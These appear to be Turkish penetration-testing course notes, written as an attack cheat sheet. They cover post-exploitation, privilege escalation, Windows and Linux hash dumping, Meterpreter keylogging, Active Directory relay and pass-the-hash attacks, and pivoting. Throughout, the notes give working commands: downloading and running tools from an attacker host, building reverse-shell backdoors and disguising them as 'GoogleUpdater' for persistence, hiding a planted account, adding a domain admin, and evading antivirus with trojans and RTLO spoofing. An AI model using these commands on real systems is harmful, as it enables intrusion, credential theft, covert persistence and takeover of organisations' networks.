###################################################################
-POST-EXPLOİTATİON
###################################################################
-WİNDOWS'TA LOCAL EXPLOİT TESPİTİ:
> artık makine içerisinde oldumuza göre bize local expiotler yardımcı olacak
> yetki yükseltmede en iyi yöntemlerden biriside çekirdek istismarıdır bunları kernel versiyonu
  service pack ler vs bize bilgi verebilmektedir 

> not: payloadların sistem mimarisine dikkat etmek gerek yani doğru seçim önemlidir 
> windowsda sistem bilgisi alabilmek için en iyi yöntemler arasınd cmd ye geçip c:\ altında 
  "systeminfo" komutunu çalıştırmaktır bu içerik çok iyi bilgi sağlamktadır 
  bu bilgileri bize otomatik yorumlayan araçlar vardır bu nedenle bunları bir belgeye kaydedelim
  
> githubdan "wesng" toolunu bitsadmin github sayfasından alalım
  github dan çektikten sonra içerisine girip çalıştırabiliriz 
  ./wes.py --update -> güncellemesini yapar 
  ./wes.py kayıt.txt -> bilgi dosyasını inceler 
  
###################################################################
-LİNUX'TA LOCAL (KERNEL) EXPLOİT TESPİTİ:
> local exploit dir ama linux da kernel expliot olarakda bilinir 
> "uname -a" yazarak kernel ve versiyon bilgilerine ulaşabiliriz 
  "uname -r" direk kernel version verir 

> windows gibi linux içinde bilgileri analiz eden araçlar bulunur 
  github dan linux exploit suggester 2 aratalım jondonas yapımcısının sayfasında bulunur 

> github deposunu çekip içerisine girelim ve "-k kernel_surumu" şeklinde parametre verirsek 
  bize olası açıkları çıkartacaktır 

> ama direk sistem için tarama yapmak istersek parametre vermeden çalıştırabiliriz 

###################################################################
-LİNUX'A DOSYA ÇEKEREK KERNEL EXPLOİT TESPİTİ:
> python un simple http server modulu vardır bulundumuz dizini local de hostlar 
> "python -m SimpleHTTPServer" diyerek çalıştırabiliriz 
 
> herzaman sızılan makinede yazma vs yetkimiz olmayabilir 
  tmp içerisinde herkes yazma hakkı vardır bu dizine geçelim ve çekelim
  çalıştırma hakkı verelim ve çalıştıralım 

###################################################################
-METASPLOİT ÇOKLU OTURUM YÖNETİMİ: 
> exploit ederken run -j dersek session açılınca arkaplana tılırdı
> meterpreter da "bg" dersek arkaplan atar sessionu "sessions" dersek bize listeler 
> session 1 dersek 1 numaralı bir sessiona geçer 
> session -K -> tüm sessionları kapatır 
> session -k session_no -> ilgili sessionu kapatır 
> shell de ise -> bg işe yaramaz background yazmamız gerekli

-METASPLOİT İLE LOCAL EXPLOİT TESPİTİ:
> msf nin bize sağladıgı bir araç vardır 
> post/multi/recon/local_exploit_suggester 
> session umuzu arkaplana attıkdan sonr bu mıdulu kullanalım ve session id mizi verelim ve run 
  diyebiliriz 
 
-HEDEFTE LOCAL ENUMERATİON (OTOMATİK):
> elle kontrol etmek yerine otomatik olarak makinenin pek çok noktasını tarayan scriptler vardır 
> not: windows shell geçmek için meterpreterdan shell yazmak yeterlidir 
LOCAL ENUMERATION

PEASS uygulamasını indirin:
cd /opt
git clone https://github.com/carlospolop/PEASS-ng
-------------------------------------------------
Windows ve Linux için olan script'lerini bir araya getirin.
Windows x64 için olan:  /opt/PEASS-ng/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
Linux için olan:        /opt/PEASS-ng/linPEAS/linpeas.sh
-------------------------------------------------
Bir arada oldukları dizini Python ile serv edin. (Farklı bir portta yayınlamak için  python -m
SimpleHTTPServer portnumarası  şeklinde kullanabilirsiniz.)
python -m SimpleHTTPServer
-------------------------------------------------
Windows hedef makine için, Windows shell'den aşağıdaki komutla %temp% dizini içine download edin;
ardıdan cd %temp ile Temp dizinine gidip exe'yi çalıştırın. (IP'yi düzeltmeyi unutmayın.)
powershell.exe -command IWR -Uri http://10.10.10.80:8000/winPEASx64.exe -OutFile %temp%\winPEASx64.exe
cd %temp%
winpeasx64.exe
-------------------------------------------------
Linux hedefe makine için de, Linux shell'den aşağıdaki komutla /tmp dizini içine gidin ve download edin.
 Ardından çalışma izni verip çalıştırın. (IP'yi düzeltmeyi unutmayın.)

wget http://10.10.10.80:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

###################################################################
-PRIVILEGE ESCALITION SALDIRILARI:
###################################################################
-WİNDOWS'TA YETKİ YÜKSELTME (OTOMATİK):
> meterpreter shell de windows için "getuid" yetki bilgilerimizi alabiliriz 
> mesela local service kullanıcısı en yetkisiz kullanıcıdır 
> mesela system ise en yetkili olandır 
> "getprivs" dersek işlem yetkilerimizi görürüz 
  cmd üzerinden ise "whoami /priv" aynı işlemi gösterir 
  "whoami /all" -> gruplrı vs de gösterir 

> mesela meterpreter için "incognito" eklentisini import edelim 
  list_token -u -> çalabileceğimiz token varmı görmeyi sağlar 

> msf vs sayesinde otomatik halledilebilir 

-WİNDOWS'TA YETKİ YÜKSELTME (MANUEL): 
> kernel açıklarını vs aratarak manuel kodlar ile yapabiliriz 

-LİNUX'TA YETKİ YÜKSELTME (MANUEL):
> gene kernel versiyonunu aratalım ve exploit arayalım google da 
> mesela c ile yazılı bir exploit bulduk kurban makinede derleyerek çalıştırabiliriz 

-LİNUX HASH DUMP VE CRACK:
> /etc/ altındaki passwd ve shadow dosyalarımız kullanıcı bilgileri ve parola hash lerini saklar 
  bu dosyalar önemlidir 
> $?$ -> hash kısımlarındaki ilk 3 karakter hash tipini belirtir 

> bu dosyaları dump ettikten sonra kırmak için john veya hashcat kullanaabiliriz ama 
  john hem passwd hemde shadow dosyasına ihtiyaç duyar ama hashcat ile sadece shadow dosyası yeterli
  
> hashcat -m hash_id -a mod -o crack_output kırılacak_dosya password_listesi --status --force 
 
###################################################################
-WİNDOWS HASH DUMP VE CRACK:
> meterpreter session içerisinde isek zaten "hashdump" diyerek direk dump alabiliriz 
  çalışmaz ise meterpreter için
  run post/windows/gather/smart_hashdump
  
> buda çalışmaz ise veya shell de isek
  "pwdump8" programını indirip çalıştırabiliriz
  indirip kurban makineye atalım 
  meterpreter ise execute -f file.exe -i 
  
> john ile windows hash lerini kıralım 
  john win_hashdump.txt --format=NT --wordlist=wordlist.txt 
  				    --show yazarsak kırılanları gösterir 
  				    
  
-MİGRATİON (GÖÇ) İŞLEMİ:
> makineye bağlanunca task managerda garip bir isim ile çalışan bir proccess dikkat çekecektir 
> bunu yanı sıra uyumluluk sorunu yaşamamak için 
> genelde explorer.exe altına taşınmak tavsiye edilir ama bazen mavi ekran verdirtebilir 
> not: kendi kullanıcı yetkilerimizin dengi işlemlere göç edebiliriz 

> migrate 1232 -> 1232 pid inin arkasına saklanırız 

-METERPRETER SCRİPTLERİ VE ŞİFRELERİN ELDE EDİLMESİ:
> run checkvm -> makine sanal mı diye kontrol eder
> run getcountermeasure -> anti virüs vs varmı diye kontrol eder 
  varsa kapatmaya çalışır 
> run killav -> anti virüsleri sonlandırmaya çalışır 
> run getgui -> remote desktop açmaya çalışır 
> run winenum -> bilgi taraması yapar 
> run scraper -> registery dumpları almaya çalışır 
> load kiwi -> mimitkatz ye benzer 
  creds all -> kullanıcı adı ve parola dumpları almaya çalışır 
 
###################################################################

-HEDEFTE KEYLOGGER ÇALIŞTIRMA:
> keyscan_start 
  keyscan_dump
  keyscan_stop 
  
##################################################################
Meterpreter ile oturum açma bilgilerini yakalayabilmeyi veya bunu bir post modülle kişinin ekranını 
kilitletip oturum açarken yapabilme gibi senaryolar için aşağıdaki örnekleri de incelemenizi öneririm.

https://www.offensive-security.com/metasploit-unleashed/keylogging/
https://www.yeahhub.com/use-keylogger-in-metasploit-framework/
https://www.infosecmatter.com/metasploit-module-library/?mm=post/windows/capture/lockout_keylogger

##################################################################
> screenshot -v true -> ekran görüntüsü alır ve açar 

##################################################################
-APT (ADVANCED PERSİSTENT THREAT) SALDIRILARI:
##################################################################
-MANUEL PAYLOAD'LAR OLUŞTURMA (BACKDOOR):
> bunun için msfvenom aracını kullanacaz
> msfvenom -p payload_adı lhost=ip lport=port -f exe > reverseshell.exe 
	-a x64 x86 -> mimari verme 
	-e encoder_adı 
	
> reverse shell i dinlemek için multi handler kullanacağız

-BACKDOOR'U SİSTEM AÇILIŞINA YERLEŞTİRME:
> windowsda açılış programlarının okundugu bir path vardır 
  cd "c:\programdata\microsoft\windows\start menu\programs\startup" altına gidelim 
> bu işlemin farklı yollarıda vardır 
> programı bu path altına eklersek otomatik başlar 

-BACKDOOR'U GÖREV ZAMANLAYICIYA YERLEŞTİRME:
> 
schtasks /create /tn GoogleUpdater /tr "C:\PerfLogs\GoogleUpdater.exe -WindowStyle hidden 
-NoLogo -NonInteractive -ep bypass -nop" /sc onstart /ru System    

> yukarıda cmd üzerinden bunu yopan komut yukardadır 
> not: windowsda servisler 120 sn içerisinde açılır startupda ise 

##################################################################
-UNQUOTED SERVİCE PATH İLE KULLANICI EKLEME:
> meterpreter shell almış isek
  run post/windows/gather/enum_services diyerek servis keşfi yapabiliriz 

> eğer bir servis yazıyorisek boşluklu path lerde tırnak içerisine almamız gerekir 
 almaz isek güvenlik açığına neden olur 
 mesela 
OpenSSHservices C:\Program Files\ssh.exe -> windows bu servisi ilk olarak C:\Program.exe olarak dener 
> sebebi ise boşluklara denk gelince program gibi çalıştırmayı dener 
  yani ssh servisi ile C:\Program.exe dosyası çalıştırılabilir önemlidir 
    
> mesela kullanıcı ekleyen bir payload yazalım 
  msfvenom -p windows/adduser user=username pass=pass_12344 -f exe > Program.exe 
  bu şekilde bunu C:\ altına atarak windowsun ssh çalıştırmak isterken bizim userimizi oluşturmasına
  neden olmaktadır 
  
##################################################################
-REGİSTRY İLE KULLANICI GİRİŞİ GİZLEME:
> giriş ekranında eklediğimiz kullanıcıyı gizlemek için yapacağız bunu 

> reg add "HKLM\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userList" 
  -v admin12 -t reg_dword -d 0 -reg:64

-REGİSTRY İLE AÇILIŞA EXE YERLEŞTİRME:
> açılış programlarından kaldırılmasını engellemek veya gizlemek için kullanacağız  
>reg add "HKLM\software\microsoft\windows\currentversion\run" -v GoogleUpdate -d 
 "C:\perflogs\googleupdater.exe" -t reg_sz -reg:64

-REGİSTRY İLE REMOTE DESKTOP'I AKTİF ETME:
>
>reg add "HKLM\system\currentcontrolset\control\terminal server" 
 -v fDenyTSConnections -t reg_dword -d 0 -reg:64
 
> -f eklersek sonuna force yani direk istediğimizi yazar 

netsh advfirewall firewall set rule group="remote desktop" new enable=yes

-METASPLOİT İLE REMOTE DESKTOP'I AKTİF ETME
> run getgui -e -> komutu ile rdp yi etkinleştirmeye çalışır 

-METASPLOİT İLE AÇILIŞA EXE YERLEŞTİRME:
> use post/windows/manage/persistence_exe
> kurbn pc deki exe adını ve bizim sistemdeki backdoor yoşunu vereceğiz 
 
##############################################################################
-ACTİVE DİRECTORY PENTEST:
##############################################################################
-LOKAL DOMAİN VE ACTİVE DİRECTORY KAVRAMLARI:
> domain şirket içi kurumsal ağlardaki network objelerinin (bilgisayar, kullanıcı, cihaz vb)
  tümleşik ve merkezi olarak yönetilmesi için oluşturulan yapıya verilen addır 
  
> domainlerin bir adı, izin yetkilendirmeleri ve üyeleri vardır 
  üyeler: kullanıcılar, bilgisayarlar, sunucular ve cihazlardan oluşabilir 
  
> domain i yöneten sunucuya DOMAIN CONTROLLER (DC) adı verilir 
  domaindeki otoritedir üyeler üzerinde tam yetki erişim ve denetime sahiptir 

> domain izinlerini (şifre politikalarını, şifre geçerlilik sürelerini, erişim ve oturum
  yetkilerini, isletim sistemi ve uygulama kullanım kısıtlamalarını vs) group policy
  GPO lar aracılıgıyla DC ler belirler 

> microsoft tarafında dc rolu ustlenebilecek ürünler server işletim sistemleridir 
  windows server işletim sistemlerinde DC ler, AC active directory uygulması ile yönetilirler 
  AD üyeleri için yönetimsel bir veritabanıdır 
  
> DC yapının buyuklune göre birden fazlada olabilir domainde aynı şekilde 

>KULLANICILAR:
 - domain admin: domain yöneticisi olan kullanıcıdır domaindeki tüm objelerde en yetkili kullanıcıdır
   uzaktan ve lokal olarak işletim sisteminde tam erişimli yetkilidir 
   birden fazla olabilir 
   
 - local admin: ilgili işletim sisteminde yönetici olan kullanıcıdır 
   birden fazla olabilir 
  
 - domain user: işletim sisteminde ve domainde sınırlı haklara sahip kullanıcıdır 
   yetkileri dc ler üzerindeki gpo lar ile belirlenir 
   	

#################################################################3
-KURULUMLAR:

-DOMAİN KURULUMU VE ACTİVE DİRECTORY AYARLARI:
> domin controller lar genelde kendisini dns olrak görür 1.dns kendisi yazılmalıdır bu nedenle 

> bazı onemli konumlar 
	- C:\Windows\NTDS -> log ve database dosyaları 
	- C:\Windows\SYSVOL -> sysvol dosyları 
	

> ortak alan oluşturma:
	> güvenliği önemseyen yerlerde nfs lere yetkilere dikkat edilir ama 
	  dikkat edilmeyen yerlerde hepsine tik atılır genelde 
	  
> network discovery yi kapatalım 
> trend micro antivirüs kullanılabilir bu domain pc lerde 

-GROUP POLİCY KAVRAMI VE KULLANIMI:
> oturum açan kullanıcıları ilgilendirir 
> sistem ayarları şifre uzunluk ve kullanum süreleri 
> bunları dc üzerinden yapılınca oturum açan kullanıcılar bunları değiştiremez 
> firewall vs ayarları hepsi yapılabilir 

> cmd den gpupdate /force dersek bu değişiklikler hemen uygulnmaya başlar 


#################################################################3
-ACTİVE DİRECTORY ATAK VEKTÖRLERİ:
#################################################################3
-LM, NT HASH, NTLMV1/2 KAVRAMLARININ PEKİŞTİRİLMESİ:

|HASH	 ÖZELLİKLERİ			      FONKSİYONU	VERİTABANI	P.T.H ATAK
|LM    -> 80 lerde kullanılırdı en eskisi         - DES	  	-SAM veya NTDS	   - evet 
|
|NT    -> LM HASH i güçlendirmek için	        - MD4		-SAM veya NTDS	   - evet 
|          geliştirildi 				
|
|NTLMv1-> Network ortamındaki doğrulama    - NT/LM + DES 	 -NTDS		   - hayır  
|          larda kullanılır nt ve/veya 
| 	   ntlm kullanır 
|
|NTLMv2-> doğrulama sırasındaki erişimin     	-MD5		 -NTDS		   - hayır
|	  ntlmv1 e göre güçlendirilmiş 
| 	  halidir 
|___________________________________________________________________________

> LM ve NT yerel doğrulamada kullanılır 
> NTLMv1/2 ise ağ ortamınd doğrulma için kullanılır 
> LM ve NT birleşince NT hash oluşur ama biz NTLM diyoruz hala 
> local doğrulama için olanlar makinede SAM dosyasında domainde ise NTDS dosyasında tutulur 
> ntlm de sunucu bir id gönderir kişinin kullanıcı adı ve parolası ile hash lenerek geri 
  gönderikmesi gerekir 
  
#######################################################################################
-LLMNR/NBT-NS POİSONİNG VE NTLMV2 CAPTURE

LLMNR -> Link Local Multicast Name resulution
NBT-NS -> NetBios NameServer 
> bunlar dns lerin olmadugu ortamlarda pc lerin birbirlerini çözümlemesini sağlayan 
  yardımcı protokollerdir 

> bir kişi herhangi bir cihaza erişmek istediğinde ağda yayın yapar brodcast olarak 
  bunu suistimal ederek yapacağız bu işlemi

> bu işlem için "responder" adlı aracımızı kullnacaz
  
> responder -I interfaace_neme -d  
	> -d -> NBT-NS için 
	> -f -> fingerprint yani hasssas bilgi bulursa getirir 
	> -w -> ortamda proxy server varsa otomatik alsın wpat sorguları için
	> -r -> yönlendirme şeklinde yapar 
	> -v -> verbos

-SMB İLETİŞİMİNİ KESME VE NTLMV2 CAPTURE:
> birisi yanlış sorgulama yapmazsa eğer bunu yapmamız gerekir 
> bildiklerimizi birleştirmemiz gerek 
> arp ve dns spoofing yapacaz paketleride drop edersek iletişim duracaktır 
  sonra kişi farklı isimler deniyerek hash yakalamamızı sağlıcaktır 
  
> /etc/ettercap/etter.dns dosyamızı açalım gene 

	YAZILIM-PC.sireket.local	A	my_ip 
	YAZILIM-PC			A	my_ip

> 2.gösterim workgrup dur 1.deki gibi drop edilecek domain i yani pc yi yazalım ve kendi ip
  adresimize yönlendirelim
> sonra /proc/sys/net/ipv4/ip_forward dosyasına 0 yazalım ki paketler bizde drop olsun
> şimdi ettercap açalım target 1 kısmına hedefi target 2 kısmına ise domain controller veya dns 
  sunucusu varsa o ve diğer hedefimizi ekliyoruz 
  
> yukarıdaki ayarlara bakarsak eğer birisi ağda YAZILIM-PC diye sorarsa bizim tuzağımıza düşecektir 


-NTLMV2 HASH CRACKİNG:
> hash i txt ye yazarak hash cat ile uygun hash modu ile crack işlemini başlatabiliriz 


-SMBV2 SİGNİNG KULLANIM TESPİTİ:
> smb v2 de smb imza modu açık değilse relay saldırı yapabiliriz 
> nmap --script smb2-security-mode 192.168.1.0/24 -p 445
	> tüm network de smb nin çalıştıgı ön tanımlı portu taricaz 
> eğer imzalama açık değilse veya açık olupta kullanmaya gerek yok bildirimi veriyorsa 
  saldırabiliriz demektir 
  
> dc serverlerde bu zorunlu olarak açıktır 

-SMB RELAY SALDIRISI VE NTLM HASH CAPTURE: 
> bu sefer responder içerisindeki smb sunucusunu kapatmamuz gerek çünkü sunucu görevini 
  smb relay toolu alacaktır 
  bunu yapmak için /etc/responder/Responder.conf içerisinde 
  SMB=Off ve HTTP=Off olacak şekilde ayarlayalım 
  
> şimdi github uzerinden SecureAuthCorp yapımcısına ait impacket toolunu çekelim
  not:çok güçlü araçlardır bunların içindeki araçları kullanmayı öğrenmek baya yarar sağlar 
  
> çektiğimiz klasörün içerisine gidelim ve 
	> ./ntlmrelayx.py -tf target_file.txt -smb2support 
	
> bu saldırı tipi local SAM databasesini çekmeyi sağlar 

-TÜM AĞDA VE UZAKTAN (REMOTE) HASH DUMP:
> msfconsole açalım bi 
> use auxiliary/scanner/smb/secretsdump
> bu modulde ihtiyaç duyulanlar 
	> smb şifresi - demin dump ettiğimiz mesela 
	> smb user - local user 
	> rhost u /24 şeklinde veriyoruz ki tüm ağda denesin  
	> threads 10 yapalım bi 5 idealdir ama 
> not: uac kullnımı bu saldırıyı engelleyebilir 
> ntds.dit 

-ÖNBELLEKLENMİŞ (CDLC) ŞİFRE HASH'LERİNİ ELDE ETME:
> impecket içerisindeki secretdump u kullanacz
> ./secretdump.py "domain_name/kullnıcı_adı:şifre@kullanılacak_ip_adresi"
> önceden oturum açmış kullanıcıların önbelleklenmiş şifrelerini vs almayı sağlar 
> buradan aldıgımız hash leri kırma kısmına gelelim
	> ms-cache algoritması ile (genede v2) hashlenir hashcat de 2100 dü galiba numarası
	 

-PSEXEC İLE SHELL ALIMI - DEFENDER VS TRENDMİCRO:
> msfconsole yi açalım 
> ve search psexec diye aratalım 
> exploit/windows/smb/psexec i kullanabiliriz 
> lhost domain kullanıcı adı ve şifresini verelim 
> ve run diyelim 
> ama bunu defender ve trendmicro algıladı deneme sırasınd 

> bu seferde psexec.py ile deniyelim
	> psexec.py "domain/kullanıcı_adı:şifre@ip_adresi"
	> not: " yerine eğer başarısız olursa ' kullanmayı deneyebiliriz 
	> microsoft defender bunu algılayamadı ama trendmicro yakaladı gene 
	
#####################################################################
-FAKE SMB SERVER SALDIRISI:
> sahte smb sunucusu olarak bize gelenlerin hash bilgilerini alalım 
> msfconsole yi açalım öncelikle 
> search "capture smb" gibi bir arama yapalım
> auxiliary/server/capture/smb/ yi kullanalım bi 
> JOHNPWFILE a hashleri kaydedebilmek için bir dosya ismi atayalım
> sonrasında run dememiz yeterli
 
-SMB RELAY SALDIRISI İLE NC SHELL ALIMI:
> responderimizi açmamız gerekecek ama gene config dosyasındaki SMB server ve HTTP server ayarının
  kapalı olması gerek 
> nmtl relayımızıda açalım 
> ntlmrelayx.py -tf taget_file.txt -smb2support -i
  buradaki -i interaktif olması demektir 
  succes diyenleri nc 127.0.0.1 port_nosu şeklinde dinleyebiliriz 
> bunlar smb imzalama zorunlu olmadıgı veya kapalı olması durumları nedeniyle olmaktadır 


#####################################################################
-PASS-THE-HASH SALDIRILARI - LATERAL MOVEMENT:
#####################################################################
-ŞİFRE PÜSKÜRTME (PASSWORD SPRAYİNG) SALDIRISI:
> elimizdeki şifreleri network e püskürterek başka kimler bunları kullanıyor görmeyi amaçlar 
> kendimize bir user wordlisti oluşturalım 
> msfconsole yi açalım "crackmapexec de vardır ama msf kalıcıdır" 
> exploit/scanner/smb/smb_login i kullanabiliriz 
> rhost olarak 192.168.1.0/24 şeklinde tüm ağı tara diyebiliriz 
> smbpass test_adilecek_password mesela test1234
> user_file olarakda kullanıcı adı wordlistini verelim threads ayarlayıp run edebiliriz 


> crackmape exec ile yapımı
> apt install crackmapexec diyerek indirelim 
> pek çok modulu vardır ama biz smb yi kullanacaz 
> crackmapexec smb 192.168.1.0/24 -d . -u user_wordlist.txt -p "denecek_şifre"  --continue-on-success
				   |-> -d domain demektir local userleri deniyor isek "." koymak yeterli

#####################################################################
-ÜM NETWORK'E PASS-THE-HASH (PTH) SALDIRISI:
> elimizde kıramadıgımız bir hash var mesela veya uğraşmadık 
> ntlm v2 hashleri bu atağa karşı korumalıdır bu nedenle NTLM yani NT hash lazım bize 
> msf bu hash lerin ::gerekli_alan:: ":" ları silmek lazım 
> msfconsoleyi açalım birde 
> use auxiliary/scanner/smb/smb_login
	> set rhost diyerek 192.168.1.0/24 diye yüm ağı verelim
	> set smbuser kullanıcı_adı 
	> set smbpass hash_değeri
	> ve run diyelim
	> set user_file verirsek smbuser yerine bu sayede bu hash ve olası userleri dener 

> crackmapexec ile yapılısına bakalım 
> crackmapexec smb ip_Adresi -d . -u user_list.txt -H "hash_değeri" --shares 
	> --shares demek girilebiliyor ise neler paylşılıyor göster demektir 
	> --spider klasör_name --pattern txt 
		> ilgili klsör isminden txt leri getirir 
		
> psexec ile yapalım birde 
> psexec.py "master:@ip_Adresi" -hashes "hash_değeri" 

##################################################################################
-PTH SALDIRISI İLE HASH DUMP:
> crackmapexec smb ip_adresi -d domain_adresi -u domain_user -H "hash_değeri" --sam
	> eğer başarılı olursa ilgili cihazın sam db sini çeker ama kullnıcının yetkili olması gerek 
	> --ntds dersek domain admini ise direk tüm domaindeki hash leri çıkartır 
	 

-PTH SALDIRISI İLE PAYLAŞIM VE KULLANICI YETKİ TESPİTİ:
> smbmap aracını kullanacaz 
> smbmap -u kullanıcı_adı -p "hash_değeri" -H ip_adresi -q
	> -q -> sessiz verbose demektir 
	> -x komut_ -> komut yürütme sağlar mesela whoami /all
	
-PTH SALDIRISI İLE DOSYA DOWNLOAD-UPLOAD:
> smbmap -u user_name -d workgroup -p password_hash -H target_ip -r pylaşılan_klasor 
	> ilgili klasör içeriğini çeker 
	> --download "paylaşılan_klasor/dosya" 
	> --upload  "/home/user/dosya.txt" "paylaşılan_klasor/dosya" 
	
-PTH SALDIRISI İLE DOSYA ÇALIŞTIRMA:
> crackmapexec smb target_ip -d domain_adı -u kullanıcı_adı -H user_pass_hash --exec-method smbexec -x "cmd_komutu"

-PTH SALDIRISI İLE RDP KULLANIMI:
> önce apt install freerdp2-x11 i indirelim
> xfreerdp -d domain_name -u domain_user -pth pasword_hash -v target_ip
> ama domaindeki koruma ayarı nedeniyle rdp başarısız olursa şu keyi cmd den girelim uzak komut ile 
> reg add HKLM\System\CurrentControlSet\Control\Lsa -t REG_DWORD -v DisableRestrictedAdmin -d 0x0 -f
> not smb exe yerine sadece -x vermekte olur 

-PTH SALDIRISI İLE DOMAİN'İ ELE GEÇİRME:
> crackmapexec smb target_ip -d domain_name -u user -H hash exec-method -x "net user kullanıcı_adı şifr_yeni /add /domain" 
> crackmapexec smb target_ip -d domain_name -u user -H hash exec-method -x "net group \"domin admins\" kullanıcı_adı /add /domain " 

> kendi eklediğimiz user artık domain admin geçmiş olsun dc için 


######################################################################################################
-ANTİVİRÜS ATLATMA VE TROJAN SALDIRILARI:
######################################################################################################
-VEİL FRAMEWORK KURULUMU:
> apt install veil -> ilk önce depodan indirelim 
> açınca bize sorular soracak 

-Trojan'ler Hazırlama kısmın geçelim 
> evasion kullanalım mesela 
> yzılım bilgisi bu noktada önemlidir kaynak kodları duzenleyerek trojanın antivirüse yakalanma durumunu baya azalyırız 
> ayar menusunde genel ayarların olabildiçe dışına cıkmakta fayda varadır 

> INJECT_METHOD ayarımız mesela RAM deki yerleşme modu heap veya virtual iyidir 
> on tanımlı port kesinlikle değiştirilmeli 
> sleep mode da aynı şekilde 12 gibi değerler vermek iyidir 
> domain ve kullanıcı adı mesela spesifik hedefler için baya iyidir 

> generate dediğimiz zaman ilk olarak isim isticektir masum isimler iyidir 
> EPC bilgisi trojan işinde baya iyidir 
	> dll inject mesela aes şifreleme vs socket programlama 
	
-TROJAN'LERİ ONLİNE TEST ETME VE NO DİSTRİBUTE HK.:
> nodistribute.com
> antiscan.me
> virüstotal vs gibi hizmetler taratılan dosyaları paylaşır buda dosyaların 24 sat sonr oda en fazla ile yaramaz olmsı demektir 

-EMBED FİLE HAZIRLAMA:
> gömülü dosya nasıl yapılır ona bakacaz
 > winrar ile sfx arşiv oluşturarak yapılbilir mesela 
 
-TROJAN'E RTLO (U+202E) UYGULAMA:
> buna file extension spoof da denmektedir 
> gnome characters ile yapabiliriz 
> standardı 202E dir sağdan sola kaydırır 

-OTOMATİK EMBED TROJAN HAZIRLAMA:
> kalide bu işlemi shelter ile yapacağız 
> shellter kullanacağız 
> shellteri wine ile açalım kali içinde yüklü gelecektir 
> açılımca otomatik modmu kullanılsın diye falan sorar otomatik diyelim
> ilk olarak masum exe mizi veriyoruz ma 32 bit olması gerek 
>

-ANTİVİRÜS MODLARI VE DAVRANIŞLARI HAKKINDA:
> gelişmiş antivirüsler indirilen kopyalanan dosyları kullanıcı açmadan kontrol eder 
> indirme vs enegllerken dosya şifreli ise antivirüsler içeriğe bakamaz 

######################################################################################################
-RELAY VE PİVOTİNG SALDIRILARI:
######################################################################################################
-PİVOTİNG'İN KAVRANMASI:
> bizim erişemediğimiz makinelere erişim izni olan makineler üzerinden erişmek için
> firewall kuralları vs nedniyle olası bir durumdur 

-PORT YÖNLENDİRME İLE İZİNSİZ HEDEFE ERİŞİM:
> şuan pivot yani aracı makinede shell aldıgımızı dusunerek hreket edecez 
  meterpreter shell e göre anlatacaz
  
> portfwd komutunu kullnacaz
 	> list -> yönlendirmeleri gösterir varsa 
> portfwd add -l 1234 -r 10.10.10.20 -p 3389 -> makienin 1234 portundan gelen bağlantıyı 10.10.10.20 nin 4489 una gönder demektir 
> tunelleme işlemi nedeniyle bağlantıyı pivot makineye değilde kendi 127.0.0.1:1234 üne yapacaz
  doğrudan yapamayız yani
  

-BİLİNMEYEN DİĞER AĞLARIN VE HEDEFLERİN TESPİTİ:
> meterpreter shell ile ipconfig çekince networkler görünecektir 
> run autoroute -s route_edilecek_network/24
	        -p -> bu işlemi kalıcı yapar 
	        
> bu script kullanımdan kalkcak kalkarsa eğer diye 
	> meterpreter shell i bg yazarak arkaplana alalım
	> use post/multi/manage/autoroute 
	> girelim ve session vs subnet bilgilerini girelim 
	> ve run edelim

> artık msf içerisinde meterpreter açık oldukça bu networke bağlanabiliriz 





 
